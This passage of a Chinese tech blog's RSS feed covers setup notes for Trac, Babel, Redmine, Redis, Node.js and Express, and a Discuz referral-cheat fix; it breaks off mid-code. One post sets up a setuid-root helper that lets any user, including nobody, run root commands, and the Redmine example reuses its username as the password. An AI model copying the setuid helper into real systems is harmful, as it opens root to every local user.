帐号管理方面 <code>trac</code> 比较弱，只能通过 <code>trac-admin</code> 命令行工具来管理，小团队使用还是可以接受的，另外仅支持HTTP认证，配上HTTPS布署到外网也算是不错的选择。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">配置权限</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li>为 <code>admin</code> 用户赋予管理员权限

<div class="org-src-container">

<pre class="src src-python">trac-admin LearnTrac permission add admin TRAC_ADMIN
</pre>
</div>
</li>
</ul>

<p>
现在可以在WEB界面上看到“管理”标签页了，可以在WEB界面上对权限进行配置。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[python应用国际化：Babel]]></title>
            <link>/article/python-5e94752856fd96455316ff1a-babel.html</link>
            <guid>/article/python-5e94752856fd96455316ff1a-babel.html</guid>
            <pubDate>Sun, 09 Mar 2014 11:54:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="http://babel.pocoo.org/">Babel</a> 是 <code>Python</code> 的一个国际化工具包，原本为<i>Edgewall.org</i>下的一个项目，现在已经转为由<i>pocoo.org</i>维护。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">统一管理 <code>Python</code> 虚拟环境</h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-sh">yaourt -S python-virtualenvwrapper
mkdir $<span style="color: #f0c674;">HOME</span>/.virtualenvs
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'export WORKON_HOME=$HOME/.virtualenvs'</span> &gt;&gt; ~/.bashrc
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'source virtualenvwrapper.sh'</span> &gt;&gt; ~/.bashrc
<span style="color: #b294bb;">source</span> ~/.bashrc
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">建立学习 <code>Babel</code> 专用虚拟环境</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh">mkvirtualenv --python=/usr/bin/python2 --no-site-packages LearnBabel
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">编译安装 <code>Babel</code></h2>
<div class="outline-text-2" id="text-3">
<div class="org-src-container">

<pre class="src src-sh">git clone https://github.com/mitsuhiko/babel.git
<span style="color: #b294bb;">cd</span> babel
pip install pytz
python setup.py import_cldr
pip install --editable .
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">常用信息国际化</h2>
<div class="outline-text-2" id="text-4">
<pre class="example">
&gt;&gt;&gt; from babel import Locale
&gt;&gt;&gt; locale = Locale('en', 'US')
&gt;&gt;&gt; print locale.territories['CN']
China
&gt;&gt;&gt; locale = Locale('zh')
&gt;&gt;&gt; print locale.territories['CN']
中国
&gt;&gt;&gt; month_names = locale.months['format']['wide'].items()
&gt;&gt;&gt; for idx, name in sorted(month_names):
...   print name
... 
一月
二月
三月
四月
五月
六月
七月
八月
九月
十月
十一月
十二月
&gt;&gt;&gt; from datetime import date
&gt;&gt;&gt; from babel.dates import format_date
&gt;&gt;&gt; today = date.today()
&gt;&gt;&gt; print format_date(today, locale='zh')
2014年3月9日
</pre>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">任意信息国际化</h2>
<div class="outline-text-2" id="text-5">
<ul class="org-ul">
<li>创建python程序： <code>hello.py</code>

<div class="org-src-container">

<pre class="src src-python"><span style="color: #b5bd68;">import</span> gettext
gettext.bindtextdomain(<span style="color: #8abeb7;">'messages'</span>, <span style="color: #8abeb7;">'./hello.i18n'</span>)
<span style="color: #f0c674;">_</span> = gettext.gettext
<span style="color: #b5bd68;">print</span> _(<span style="color: #8abeb7;">'Hello'</span>)
</pre>
</div>
</li>

<li>创建Babel配置文件： <code>hello.babel</code>

<pre class="example">
[python: hello.py]
</pre>
</li>

<li>准备翻译成中文

<div class="org-src-container">

<pre class="src src-sh">mkdir hello.i18n
pybabel extract -F hello.babel . -o hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P</span><span style="color: #969896; font-style: italic; text-decoration: underline;">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;</span>
pybabel init -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#23558;POT&#25991;&#26412;&#25335;&#36125;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">&#20986;&#19968;&#20221;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;</span>
</pre>
</div>
</li>

<li>译成中文后的PO文件： <code>./hello.i18n/zh_CN/LC_MESSAGES/messages.po</code>

<pre class="example">
# Chinese (Simplified, China) translations for PROJECT.
# Copyright (C) 2014 ORGANIZATION
# This file is distributed under the same license as the PROJECT project.
# FIRST AUTHOR &lt;EMAIL@ADDRESS&gt;, 2014.
#
#, fuzzy
msgid ""
msgstr ""
"Project-Id-Version: PROJECT VERSION\n"
"Report-Msgid-Bugs-To: EMAIL@ADDRESS\n"
"POT-Creation-Date: 2014-03-09 19:08+0800\n"
"PO-Revision-Date: 2014-03-09 19:12+0800\n"
"Last-Translator: FULL NAME &lt;EMAIL@ADDRESS&gt;\n"
"Language-Team: zh_Hans_CN &lt;LL@li.org&gt;\n"
"Plural-Forms: nplurals=2; plural=(n != 1)\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=utf-8\n"
"Content-Transfer-Encoding: 8bit\n"
"Generated-By: Babel 2.0-dev\n"

#: hello.py:1
msgid "Hello"
msgstr "喂"
</pre>
</li>

<li>编译翻译结果

<div class="org-src-container">

<pre class="src src-sh">pybabel compile -f -d ./hello.i18n    <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;</span>
</pre>
</div>
</li>

<li>英文环境下运行程序

<pre class="example">
python ./hello.py
Hello
</pre>
</li>

<li>中文环境下运行程序

<pre class="example">
LC_ALL=zh_CN python ./hello.py
喂
</pre>
</li>

<li>更新 <code>hello.py</code> ，追加一句“      print _('World')”
</li>

<li>将“World”翻译成中文

<div class="org-src-container">

<pre class="src src-sh">pybabel extract -F hello.babel . -o hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P</span><span style="color: #969896; font-style: italic; text-decoration: underline;">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;</span>
pybabel update -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20174;POT&#25991;&#26412;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">&#26356;&#26032;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#24320;&#22987;&#32763;&#35793;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;&#65306; hello.i18n/zh_CN/LC_MESSAGES/messages.po</span>
pybabel compile -f -d ./hello.i18n    <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;</span>
</pre>
</div>
</li>

<li>再次运行

<pre class="example">
LC_ALL=zh_CN python ./hello.py
喂
世界
</pre>
</li>

<li>程序中强制使用中文语言： <code>hello.cn.py</code>

<div class="org-src-container">

<pre class="src src-python"><span style="color: #b5bd68;">import</span> gettext

<span style="color: #f0c674;">t</span> = gettext.translation(<span style="color: #8abeb7;">'messages'</span>, <span style="color: #8abeb7;">'./hello.i18n'</span>, languages=[<span style="color: #8abeb7;">'zh_CN'</span>])
<span style="color: #f0c674;">_</span> = t.gettext

<span style="color: #b5bd68;">print</span> _(<span style="color: #8abeb7;">'Hello'</span>)
<span style="color: #b5bd68;">print</span> _(<span style="color: #8abeb7;">'World'</span>)
</pre>
</div>
</li>

<li>即使是在英文环境下也输出中文

<pre class="example">
LC_ALL=en_US python ./hello.py
喂
世界
</pre>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CentOS 6.4下安装redmine]]></title>
            <link>/article/centos-6.4-4e0b5b8988c5-redmine.html</link>
            <guid>/article/centos-6.4-4e0b5b8988c5-redmine.html</guid>
            <pubDate>Fri, 07 Mar 2014 06:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本文为CentOS 6.4下安装redmine-2.5.0的笔记，按照 <a href="http://www.redmine.org/projects/redmine/wiki/RedmineInstall">官方文档</a> 进行安装。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">安装 <code>ruby</code></h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-sh">yum install ruby
yum install ruby-devel
yum install rubygems
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">安装 <code>redmine</code></h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh">wget <span style="color: #8abeb7;">'http://www.redmine.org/releases/redmine-2.5.0.tar.gz'</span>
tar xzvf redmine-2.5.0.tar.gz
gem install bundler
gem install mysql2.
yum install ImageMagick ImageMagick-devel
bundle install --without development test
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">配置 <code>redmine</code></h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li>以 root 用户登录 <code>mysql</code>

<div class="org-src-container">

<pre class="src src-sh">mysql -uroot -p
</pre>
</div>
</li>

<li>创建 <code>redmine</code> 用户及库

<div class="org-src-container">

<pre class="src src-sql"><span style="color: #b5bd68;">CREATE</span> DATABASE redmine <span style="color: #81a2be;">CHARACTER</span> <span style="color: #b5bd68;">SET</span> utf8;
<span style="color: #b5bd68;">CREATE</span> <span style="color: #b294bb;">USER</span> <span style="color: #8abeb7;">'redmine'</span>@<span style="color: #8abeb7;">'localhost'</span> IDENTIFIED <span style="color: #b5bd68;">BY</span> <span style="color: #8abeb7;">'redmine'</span>;
<span style="color: #b5bd68;">GRANT</span> <span style="color: #b5bd68;">ALL</span> <span style="color: #b5bd68;">PRIVILEGES</span> <span style="color: #b5bd68;">ON</span> redmine.* <span style="color: #b5bd68;">TO</span> <span style="color: #8abeb7;">'redmine'</span>@<span style="color: #8abeb7;">'localhost'</span>;
</pre>
</div>
</li>

<li>修改数据库配置文件

<div class="org-src-container">

<pre class="src src-sh">cp config/database.yml.example config/database.yml
diff config/database.yml config/database.yml.example
10,11c10,11
&lt;   username: redmine
&lt;   password: <span style="color: #8abeb7;">"redmine"</span>
---
&gt;   username: root
&gt;   password: <span style="color: #8abeb7;">""</span>
</pre>
</div>
</li>

<li>初始化会话存储

<div class="org-src-container">

<pre class="src src-sh">rake generate_secret_token
</pre>
</div>
</li>

<li>创建数据库表结构

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #f0c674;">RAILS_ENV</span>=production rake db:migrate
</pre>
</div>
</li>

<li>解决上一步可能出现的错误

<blockquote>
<p>
rake aborted!
Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
</p>

<p>
Tasks: TOP =&gt; db:migrate =&gt; environment
</p>
</blockquote>

<p>
确定 <code>mysql</code> 启动时指定的 <code>mysql.sock</code> 文件的路径
</p>

<div class="org-src-container">

<pre class="src src-sh">ps aux | grep mysql.sock
</pre>
</div>

<p>
显示的 <code>mysql.sock</code> 路径可能为“ <code>--socket=/tmp/mysql.sock</code> ”
</p>

<p>
修改 <code>redmine</code> 数据库配置，在 <code>production</code> 配置中添加 <code>socket</code> 项：
</p>

<pre class="example">
production:
  ...
  socket: /tmp/mysql.sock
</pre>

<p>
重新进行上一步操作。
</p>
</li>

<li>初始化数据

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #f0c674;">RAILS_ENV</span>=production <span style="color: #f0c674;">REDMINE_LANG</span>=zh rake redmine:load_default_data
</pre>
</div>
</li>

<li>创建相关目录

<div class="org-src-container">

<pre class="src src-sh">mkdir -p tmp tmp/pdf public/plugin_assets
sudo chown -R nobody:nobody files log tmp public/plugin_assets
sudo chmod -R 755 files log tmp public/plugin_assets
</pre>
</div>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">试运行 <code>redmine</code></h2>
<div class="outline-text-2" id="text-4">
<div class="org-src-container">

<pre class="src src-sh">ruby script/rails server webrick -e production
</pre>
</div>

<ul class="org-ul">
<li>浏览器打开页面

<p>
<a href="http://localhost:3000">http://localhost:3000</a>
</p>

<p>
使用 用户名 <code>admin</code> ，密码 <code>admin</code> 登录后，立即修改密码。
</p>

<p>
使用下面的命令生成随机的密码：
</p>

<div class="org-src-container">

<pre class="src src-sh">cat /dev/urandom | head -1 | md5sum | head -c 8
</pre>
</div>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">配置 <code>redmine</code></h2>
<div class="outline-text-2" id="text-5">
<ul class="org-ul">
<li>修改 <code>config/settings.yml</code>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">使用 <code>Nginx</code> 和 <code>passenger</code></h2>
<div class="outline-text-2" id="text-6">
<div class="org-src-container">

<pre class="src src-sh">wget <span style="color: #8abeb7;">'http://nginx.org/download/nginx-1.4.6.tar.gz'</span>
tar xzvf nginx-1.4.6.tar.gz
gem install passenger
yum install pcre-devel
passenger-install-nginx-module
</pre>
</div>

<ul class="org-ul">
<li>交互式安装过程

<ul class="org-ul">
<li>Automatically download and install Nginx?

<p>
选 2. No: I want to customize my Nginx installation. (for advanced users)
</p>
</li>

<li>Where is your Nginx source code located?

<p>
填解压的 <code>nginx</code> 源码包路径
</p>
</li>

<li>Where do you want to install Nginx to?

<p>
填 <code>/usr/local/nginx</code>
</p>
</li>
</ul>
</li>

<li>修改 /usr/local/nginx/conf/nginx.conf

<p>
在最后的 <code>}</code> 前添加以下配置
</p>

<pre class="example">
include vhosts/*.conf;
</pre>
</li>

<li>添加站点配置文件 <code>/usr/local/nginx/conf/vhosts/redmine.conf</code>

<pre class="example">
server {
  listen  80;
  server_name &lt;域名&gt;;
  root &lt;redmine根目录&gt;/public;
  passenger_enabled on;
  client_max_body_size 10m; # Max attachemnt size
}
</pre>
</li>

<li>启动 <code>nginx</code>

<div class="org-src-container">

<pre class="src src-sh">/usr/local/nginx/sbin/nginx
</pre>
</div>
</li>

<li>现在可以正式访问站点了

<p>
<a href="http://">http://</a>&lt;域名&gt;
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-7" class="outline-2">
<h2 id="sec-7">支持 <code>OpenID</code> 第三方帐号登录</h2>
<div class="outline-text-2" id="text-7">
<ul class="org-ul">
<li>安装 <code>openid</code> 库

<div class="org-src-container">

<pre class="src src-sh">gem install ruby-openid
</pre>
</div>
</li>

<li>使用 <code>admin</code> 帐号登录系统，在“管理 - 配置 - 认证”中勾选上“允许使用OpenID登录和注册”。 
</li>

<li>用户注册时“密码”可以省略， 填上 <code>OpenID URL</code> 即可。
</li>

<li>如何获得Google的OpenID URL？

<ul class="org-ul">
<li>先在 <code>Google</code> 的站点上登录
</li>
<li>打开 <a href="https://profiles.google.com">https://profiles.google.com</a> 后会跳转到类似这样（ <code>https://plus.google.com/000000000000000000000/posts</code> ）的网页
</li>
<li>你的 <code>OpenID URL</code> 为 <a href="http://profiles.google.com/000000000000000000000">http://profiles.google.com/000000000000000000000</a>
</li>
</ul>
<p>
上面的 <code>000000000000000000000</code> 可能为任意的数字串
</p>
</li>

<li>管理员确认注册后即可在登录界面上输入 <code>OpenID URL</code> 直接登录

<p>
一般浏览器的输入框是有记忆功能的，双击后会出现输入历史下拉列表，直接选择即可。
</p>
</li>

<li>安装插件简化 <code>OpenID</code> 登录

<ul class="org-ul">
<li><a href="https://github.com/jorgebg/redmine-openid-selector">https://github.com/jorgebg/redmine-openid-selector</a> （不推荐） 为原始分枝，在 <code>redmine-2.5.0</code> 下不能直接安装会导致站点登录界面出现404错误，解决方案在 <a href="http://www.redmine.org/boards/3/topics/34327?r=38778#message-38778">这里</a> ，简而言之就是把插件目录名中的 <code>-</code> 改为 <code>_</code> 。
</li>

<li><a href="https://github.com/computerminds/redmine_openid_selector">https://github.com/computerminds/redmine_openid_selector</a> （不推荐） 这个分枝安装后可用，但界面为英文（其实界面就一句英文）。
</li>

<li><a href="https://github.com/tangxinfa/redmine_openid_selector">https://github.com/tangxinfa/redmine_openid_selector</a> （推荐） 为支持中文我fork了上一个分枝。
</li>

<li>通用的插件安装过程：

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">cd</span> plugins
git clone https://github.com/tangxinfa/redmine_openid_selector.git
rake redmine:plugins:migrate <span style="color: #f0c674;">RAILS_ENV</span>=production
touch tmp/restart.txt
</pre>
</div>
</li>

<li>通用的插件卸载过程：

<div class="org-src-container">

<pre class="src src-sh">rake redmine:plugins:migrate <span style="color: #f0c674;">NAME</span>=redmine-openid-selector <span style="color: #f0c674;">VERSION</span>=0 <span style="color: #f0c674;">RAILS_ENV</span>=pr<span style="text-decoration: underline;">oduction</span>
rm -rf plugins/redmine-openid-selector
touch tmp/restart.txt
</pre>
</div>
</li>
</ul>
<p>
现在在登录及注册页面直接点击第三方站点Logo即可。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-8" class="outline-2">
<h2 id="sec-8">样式美化</h2>
<div class="outline-text-2" id="text-8">
<div class="org-src-container">

<pre class="src src-sh">git clone git://github.com/pixel-cookers/redmine-theme.git public/themes/pixel-c<span style="text-decoration: underline;">ookers</span>
touch tmp/restart.txt
</pre>
</div>

<p>
现在可以使用 <code>admin</code> 登录后台，在“管理 - 配置 - 显示 - 主题”中启用主题 <code>Pixel-cookers</code> 。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[编译安装redis]]></title>
            <link>/article/7f168bd15b8988c5-redis.html</link>
            <guid>/article/7f168bd15b8988c5-redis.html</guid>
            <pubDate>Mon, 17 Feb 2014 08:40:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>下载

<p>
到 <a href="http://redis.io/download">http://redis.io/download</a> 下载最新稳定版本。
</p>
</li>

<li>安装

<p>
解压后参照 README 进行安装：
</p>

<div class="org-src-container">

<pre class="src src-sh">make
make install
</pre>
</div>

<p>
默认安装到/usr/local。
</p>

<p>
指定位置安装： 
</p>

<div class="org-src-container">

<pre class="src src-sh">make <span style="color: #f0c674;">PREFIX</span>=/usr/local/redis install
</pre>
</div>
</li>

<li>安装后

<dl class="org-dl">
<dt> /usr/local/bin/redis-cli </dt><dd>redis客户端程序 
</dd>
<dt> /usr/local/bin/redis-server </dt><dd>redis服务器程序
</dd>
</dl>
</li>

<li>配置

<p>
将源码包附带的配置文件 <code>redis.conf</code> 拷贝到安装位置:
</p>

<div class="org-src-container">

<pre class="src src-sh">mkdir /usr/local/redis/etc/
cp ./redis.conf /usr/local/redis/etc/
</pre>
</div>

<p>
修改配置文件 <code>redis.conf</code> :
</p>

<pre class="example">
daemonize yes
pidfile /usr/local/redis/var/redis.pid
logfile /usr/local/redis/var/redis.log
dir /usr/local/redis/data
stop-writes-on-bgsave-error no
bind 127.0.0.1
</pre>
</li>

<li>启动

<div class="org-src-container">

<pre class="src src-sh">/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf
</pre>
</div>
</li>

<li>停止

<p>
使用redis客户端中执行shutdown命令
</p>

<div class="org-src-container">

<pre class="src src-sh">redis-cli
shutdown
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[编译安装node.js]]></title>
            <link>/article/7f168bd15b8988c5-node.js.html</link>
            <guid>/article/7f168bd15b8988c5-node.js.html</guid>
            <pubDate>Mon, 17 Feb 2014 08:23:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>下载

<p>
node.js是一个新兴的开发平台，版本更新非常活跃，因此应该尽量下载安装最新的版本。
</p>

<p>
到 <a href="http://nodejs.org/">http://nodejs.org/</a> 下载最新的版本。
</p>
</li>

<li>安装

<p>
解压后参照 README.md 进行安装：
</p>

<div class="org-src-container">

<pre class="src src-sh">./configure
make
make install
</pre>
</div>
</li>

<li>安装后

<p>
默认安装到/usr/local。
</p>

<dl class="org-dl">
<dt> /usr/local/bin/node </dt><dd>node主程序
</dd>
<dt> /usr/local/bin/npm </dt><dd>node模块管理程序
</dd>
<dt> /usr/local/lib/node_modules </dt><dd>node全局模块目录
</dd>
</dl>
<p>
像一些需要全局安装的模块也会把文件安装在/usr/local目录下。
</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[express.js中如何在第一次请求的响应中取得connect.sid]]></title>
            <link>/article/express.js-4e2d59824f5557287b2c4e006b218bf76c42768454cd5e944e2d53d65f97-connect.sid.html</link>
            <guid>/article/express.js-4e2d59824f5557287b2c4e006b218bf76c42768454cd5e944e2d53d65f97-connect.sid.html</guid>
            <pubDate>Fri, 14 Feb 2014 15:34:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在web页面通过iframe跨域登录访问服务的情况下，是不方便取cookie中的sessionid的，于是想到将sessionid直接放到响应体中，
这就需要在node.js中直接获取connect.sid这个cookie值，一开始想当然地以为系统（使用的是passport.js）会在登录认证通过后
执行res.cookie('connect.sid', &#x2026;)进行设置，就想直接从res的Set-Cookie头解析出设置的值，结果发现这个cookie压根不存在，
甚至在库代码中搜索cookie都不管用，着实急得人直抓头。最后dump出res后确在req中见到了connect.sid值的影子：req.sessionID，
然后在 <a href="http://stackoverflow.com/questions/13693101/express-sessionid-differs-from-sessionid-in-cookie">《Express SessionID differs from SessionID in Cookie》</a> 中找到了从req.sessionID计算出connect.sid的方法：
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">signature</span> = require(<span style="color: #8abeb7;">'express/node_modules/cookie-signature'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">connectSid</span> = <span style="color: #8abeb7;">'s:'</span> + signature.sign(req.sessionID, sessionOptions.secret);
</pre>
</div>

<p>
其实，connect.sid这个cookie是在请求到来后在req上设置的（不存在则设置），不管有没有登录都会设置。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下允许普通用户执行需要root权限的命令]]></title>
            <link>/article/linux-4e0b51418bb8666e901a752862376267884c97008981-root-674396507684547d4ee4.html</link>
            <guid>/article/linux-4e0b51418bb8666e901a752862376267884c97008981-root-674396507684547d4ee4.html</guid>
            <pubDate>Thu, 26 Dec 2013 07:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
最典型的情况是要实现一个通过web界面重启系统的功能，通常为了安全会以非root用户身份（通常是nobody）运行服务端脚本，这样脚本中就不能执行危险操作了。
</p>

<p>
下面的c工具程序可以允许任意用户执行需要root权限的命令：
</p>

<p>
[[<a href="../static/as_root.c][as_root.c">../static/as_root.c][as_root.c</a>]
</p>

<p>
编译：
</p>
<div class="org-src-container">

<pre class="src src-sh">gcc -g as_root.c -o as_root
</pre>
</div>

<p>
配置：
</p>
<div class="org-src-container">

<pre class="src src-sh">chown root:root ./as_root; chmod 4755 ./as_root
</pre>
</div>

<p>
运行：
</p>
<div class="org-src-container">

<pre class="src src-sh">sudo -u <span style="color: #8abeb7;">"nobody"</span> ./as_root <span style="color: #8abeb7;">"reboot"</span>
</pre>
</div>

<p>
参考：<a href="http://blog.tianya.cn/blogger/post_show.asp?BlogID=126326&PostID=1629441">如何在普通用户下执行一些需要root用户执行的命令</a></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Discuz访问推广任务反作弊]]></title>
            <link>/article/discuz-8bbf95ee63a85e7f4efb52a153cd4f5c5f0a.html</link>
            <guid>/article/discuz-8bbf95ee63a85e7f4efb52a153cd4f5c5f0a.html</guid>
            <pubDate>Thu, 19 Dec 2013 17:02:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>识别作弊

<p>
发贴、回复较少的用户具有偏高的积分、等级通常就是潜在的作弊对象。在后台查看该用户的积分历史，如果来历不明，那么很可能是通过访问推广作弊获得的。
</p>

<p>
在我们的例子里就发现有一个用户金钱数过高，先查看该用户的积分表：
</p>

<pre class="example">
mysql&gt; SELECT total, cyclenum, extcredits2 FROM g_common_credit_rule_log WHERE rid=8 and uid=119;
+-------+----------+-------------+
| total | cyclenum | extcredits2 |
+-------+----------+-------------+
|  3454 |     3454 |           1 |
+-------+----------+-------------+
1 row in set (0.00 sec)
</pre>

<p>
相关字段说明
</p>
<dl class="org-dl">
<dt> total </dt><dd>策略被执行总次数
</dd>
<dt> cyclenum </dt><dd>周期被执行次数 
</dd>
<dt> extcredits2 </dt><dd>我们的系统里对应金钱数
</dd>
<dt> rid </dt><dd>值8为访问推广任务类型
</dd>
<dt> uid </dt><dd>值119为作弊用户id
</dd>
</dl>
<p>
从上面可以看出该用户完成了3454次任务， 接下来就需要确认这些任务是通过作弊完成的了。
</p>

<p>
搜索该用户推广链接在web服务器中留下的访问日志：
</p>
<pre class="example">
logs# grep 'fromuid=119' /usr/local/nginx/logs/access.log*
"GET /?fromuid=119.jpg HTTP/1.1" 301 6243 "http://xxxx.org/details.php?id=178668"
...
</pre>

<p>
可以初步断定，该用户通过在其它论坛中发布信息并将推广url注入到图片的url中，这样我们的站点在访问量没有任何增长的情况下该用户的推广数却瞬间彪升了。
</p>
</li>

<li>阻止作弊

<p>
通过使用引用页中的用户标识进行记录来解决这个问题，这样只有当用户来到论坛并进行了相关操作才算推荐有效。
</p>

<p>
修改source/class/discuz/discuz_application.php文件，将下面的内容：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span>((!<span style="color: #c5c8c6; background-color: #1d1f21;">empty(</span>$<span style="color: #81a2be;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>]) || !<span style="color: #c5c8c6; background-color: #1d1f21;">empty(</span>$<span style="color: #81a2be;">_GET</span>[<span style="color: #8abeb7;">'fromuser'</span>])) &amp;&amp; ($<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">var</span>[<span style="color: #8abeb7;">'setti</span><span style="color: #8abeb7; text-decoration: underline;">ng'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_visit'</span><span style="text-decoration: underline;">] || $</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_register'</span><span style="text-decoration: underline;">])) {</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">require_once</span> <span style="color: #c5c8c6; background-color: #1d1f21;">libfile(</span><span style="color: #8abeb7;">'misc/promotion'</span>, <span style="color: #8abeb7;">'include'</span>);
}
</pre>
</div>
<p>
改为：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>]) &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">strpos(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>], <span style="color: #8abeb7;">'http://</span><span style="color: #8abeb7; text-decoration: underline;">XXX.com/'</span><span style="text-decoration: underline;">) === </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">0</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">referer_query</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">parse_url(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>], <span style="color: #cc6666; font-weight: bold;">PHP_URL_QUERY</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">referer_query</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">parse_str(</span>$<span style="color: #f0c674;">referer_query</span>, $<span style="color: #f0c674;">referer_get</span>);
